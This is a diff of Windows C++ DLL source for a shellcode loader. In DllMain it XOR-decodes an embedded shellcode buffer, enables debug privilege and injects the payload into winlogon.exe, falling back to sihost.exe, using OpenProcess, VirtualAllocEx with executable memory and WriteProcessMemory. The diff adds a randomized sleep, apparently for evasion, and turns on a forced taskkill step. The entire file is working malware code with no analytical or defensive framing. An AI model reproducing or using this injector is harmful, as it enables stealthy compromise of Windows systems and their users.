@@ -53,7 +53,7 @@ int findMyProc(const char* procname) {
 	return pid;
 }
 
-BOOL EnableDebugPriv()
+void EnableDebugPriv()
 {
 	HANDLE hToken;
 	LUID luid;
@@ -68,11 +68,9 @@ BOOL EnableDebugPriv()
 	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
 	if (!AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL)) {
-		return false;
 	};
 
 	CloseHandle(hToken);
-	return true;
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
@@ -122,24 +120,24 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 			shellcode[i] = key[i % keysize] ^ shellcode[i];
 		}
 		// Inject
+		EnableDebugPriv();
+		int pid;
+		int spid = findMyProc("winlogon.exe");
+		int upid = findMyProc("sihost.exe");
 
-		int id = GetCurrentProcessId();
-		int pid = findMyProc("svchost.exe");
-		// int pid = 3312;
 		srand(clock());
-		// int num = ((rand() % (100 - 1 + 1)) + 1) * 200;
-		// Sleep(num);
+		int num = ((rand() % (100 - 1 + 1)) + 1) * 200;
+		Sleep(num);
 		HANDLE processHandle;
 		HANDLE remoteThread;
 		PVOID remoteBuffer;
-		EnableDebugPriv();
-		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
-		if (processHandle == NULL) {
-			DWORD error = GetLastError();
-			char x[100];
-			// _itoa_s(pid, x, 10);
-			sprintf_s(x, "%d", error);
-			MessageBoxA(NULL, x, x, 0);
+		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(spid));
+		if (processHandle != NULL) {
+			pid = spid;
+		}
+		else {
+			processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(upid));
+			pid = upid;
 		}
 		remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 		WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
@@ -148,7 +146,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 		
 		// Self kill
 		char cid[10];
-		_itoa_s(id, cid, 10);
+		_itoa_s(pid, cid, 10);
 		STARTUPINFO siStartupInfo;
 		PROCESS_INFORMATION piProcessInfo;
 		memset(&siStartupInfo, 0, sizeof(siStartupInfo));
@@ -156,7 +154,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 		siStartupInfo.cb = sizeof(siStartupInfo);
 		char command[] = "cmd /c taskkill /F /PID";
 		strcat_s(command, cid);
-		// int done = CreateProcess(NULL, (LPTSTR)command, NULL, NULL, TRUE, CREATE_NEW_PROCESS_GROUP, NULL, NULL, &siStartupInfo, &piProcessInfo);
+		int done = CreateProcess(NULL, (LPTSTR)command, NULL, NULL, TRUE, CREATE_NEW_PROCESS_GROUP, NULL, NULL, &siStartupInfo, &piProcessInfo);
 
 	}
 	case DLL_PROCESS_DETACH:
